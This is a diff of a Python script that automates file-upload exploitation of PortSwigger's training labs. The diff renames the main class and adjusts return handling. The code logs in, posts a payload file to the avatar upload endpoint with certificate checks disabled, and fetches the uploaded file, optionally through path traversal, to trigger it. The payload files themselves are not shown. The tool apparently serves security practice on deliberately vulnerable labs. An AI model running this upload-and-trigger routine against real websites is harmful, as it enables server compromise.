@@ -9,8 +9,6 @@ This script automatically exploits six of the labs of portswigger:
 
 Side note: The files has to be manually kept in.
 """ 
-
-
 import requests
 import re
 import payload_injection
@@ -20,12 +18,9 @@ from pathlib import Path
 import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-# session = requests.Session()
-
 dotenv.load_dotenv()
 
-
-class PortSwiggerExploit: 
+class FileUpload: 
     def __init__(self, url):
         self.url = url.rstrip("/")
         self.file_location = ""
@@ -79,16 +74,18 @@ class PortSwiggerExploit:
                 file_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=files, verify=False)
             if file_upload_post.status_code != 200:
                 print(f"{file_upload_post.status_code}: Payload containing file was not uploaded.")
+                return False
 
-            return file_upload_post.status_code
+            return True
         except requests.exceptions.RequestException as e:
             print(f"RequestError: {e}")
             return None
         except FileNotFoundError as e:
             print(f"File was not found. Check if file is readable ;-)")
+            return None
     
-    def exploit(self, status_code, path_traversal=False):
-        if status_code != 200:
+    def exploit(self, condition, path_traversal=False):
+        if not condition:
             return False
         if path_traversal:
             exploit_url = f"{self.url}/files/{self.file_name}"
@@ -119,6 +116,7 @@ class PortSwiggerExploit:
                 break
             except Exception as e:
                 print(f"Error: {e}")
+                return False
         return True
       
 
@@ -242,5 +240,5 @@ class PortSwiggerExploit:
         return False
 
 url = input("Enter the link to exploit: ")
-start = PortSwiggerExploit(url)
+start = FileUpload(url)
 start.login()
